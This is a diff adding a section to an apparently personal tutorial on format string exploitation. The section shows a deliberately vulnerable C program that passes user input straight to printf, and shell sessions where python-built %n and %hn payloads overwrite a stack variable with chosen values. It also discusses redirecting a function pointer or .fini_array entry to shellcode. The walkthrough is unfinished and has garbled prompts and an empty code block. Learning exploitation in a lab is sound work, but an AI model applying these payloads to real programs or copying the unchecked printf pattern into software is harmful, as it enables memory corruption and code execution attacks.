@@ -211,6 +211,103 @@ Success!
 
 The astute reader would have pointed out this would have been *much* simpler using `getenv` but I was hell bent on getting this to work with `gdb`. Heh.
 
-## Writing to an arbitrary address?
+## Writing to an arbitrary address
 
-TBA
+`printf` has a little known format parameter - `%n` - that writes the number of bytes written so far. The argument it takes is a memory address - something we know we can control.
+
+~~~ c
+#include <stdlib.h>
+#include <stdio.h>
+
+int
+main(int argc, char* argv[])
+{
+  unsigned int var = 0xAAAAAAAA;
+  char buffer[512];
+  strcpy(buffer, argv[1]);
+  printf(buffer);
+  printf("\n");
+  printf("var = 0x%08x and is located at %p\n", var, &var);
+  exit(0);
+}
+~~~
+
+We can see use this to overwrite an address with a different value:
+
+~~~ shell
+vagrant@vagrant:~/scratch$ gcnt:~/scratch$ gcc -m32 -g -fno-stack-protector -w printf_c.c
+vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x5c\xdb\xff\xff"+"%p.."*6 + "%n"')
+\▒0xffffdd4e..0xf7ffcf1c..0xf7fefe7a..0x8..0xf7fefe66..0xf7ffd000..
+var = 0x00000045 and is located at 0xffffdb5c
+~~~
+
+
+
+vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x5c\xdb\xff\xff"+"%x"*5 + "%100x%n"')
+\▒ffffdd57f7ffcf1cf7fefe7a8f7fefe66                                                                                            f7ffd000
+var = 0x00000089 and is located at 0xffffdb5c
+vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x5c\xdb\xff\xff"+"%x"*5 + "%120x%n"')
+\▒ffffdd57f7ffcf1cf7fefe7a8f7fefe66                                                                                                                f7ffd000
+var = 0x0000009d and is located at 0xffffdb5c
+~~~
+
+The second set of format string achieves the same thing as the first but by controlling the width of the `%x` parameter we get to change the number of bytes written and therefore the value of `var`. The question remains - what address should be overwrite and with what?
+
+Ideally this should be a function pointer - we could override that to point to shellcode stored in an environment variable (just like in the previous post). Finding one is relatively straightforward, thanks to the ELF format. But first let's make sure we can override an address with a value of our choice - say `0xffffdd5a`.
+
+
+~~~ shell
+vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "DDDD"+"%x."*7')
+DDDDffffdd25.f7ffcf1c.f7fefe7a.8.f7fefe66.f7ffd000.44444444.
+var = 0xaaaaaaaa and is located at 0xffffdb1c
+~~~
+
+We want to make `var` equal to `0xffffdd5a`.
+
+~~~ shell
+vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x1c\xdb\xff\xff"+"%x."*6 + "%n"')
+▒ffffdd26.f7ffcf1c.f7fefe7a.8.f7fefe66.f7ffd000.
+var = 0x00000033 and is located at 0xffffdb1c
+~~~
+
+The `%n` formatter writes 32 bits which is a little unwildly to work with. Instead we will use the `h` modifier to write 2 bytes at a time - one at the first half of the target address, the other at the +2 offset. Let's run our binary again:
+
+~~~ shell
+vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x1c\xdb\xff\xff"+"%x."*6 + "%hn"')
+▒ffffdd25.f7ffcf1c.f7fefe7a.8.f7fefe66.f7ffd000.
+var = 0xaaaa0033 and is located at 0xffffdb1c
+vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x1c\xdb\xff\xff\x1e\xdb\xff\xff"+"%x."*6 + "%hn%hn"')
+▒▒ffffdd1e.f7ffcf1c.f7fefe7a.8.f7fefe66.f7ffd000.
+var = 0x00370037 and is located at 0xffffdb1c
+~~~
+
+So we first write 2 bytes to `0xffffdb1c` and a further 2 bytes to `0xffffdb1e` (which is the first address + 2, for the second half). To write our target value of `0xffffdd5a` we'll therefore need to write `0xffff` and `0xdd5a`. Things however get a little tricky because changing the length of our input string impacts the offset. To get around this, we'll try to find the correct offset using a template which won't change the length of the string:
+
+~~~ shell
+vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "DDDD" + "%p.."*5 + "%0000x%p"')
+DDDD0xffffdd1e..0xf7ffcf1c..0xf7fefe7a..0x8..0xf7fefe66..f7ffd0000x44444444
+var = 0xaaaaaaaa and is located at 0xffffdb1c
+~~~
+
+If we replace `DDDD` with an address and the last `%p` with %n`, we should be able to accurately control the number of bytes written:
+
+~~~ shell
+vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x1c\xdb\xff\xff" + "%p.."*5 + "%010x%n"')
+▒0xffffdd1f..0xf7ffcf1c..0xf7fefe7a..0x8..0xf7fefe66..00f7ffd000
+var = 0x00000043 and is located at 0xffffdb1c
+vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x1c\xdb\xff\xff" + "%p.."*5 + "%011x%n"')
+▒0xffffdd1f..0xf7ffcf1c..0xf7fefe7a..0x8..0xf7fefe66..000f7ffd000
+var = 0x00000044 and is located at 0xffffdb1c
+~~~
+
+Let's now do this for 2 addresses:
+
+~~~ shell
+
+~~~
+
+~~~ shell
+vagrant@vagrant:~/scratch$ objdump -h a.out | grep fini_arr
+ 19 .fini_array   00000004  08049f0c  08049f0c  00000f0c  2**2
+~~~
+
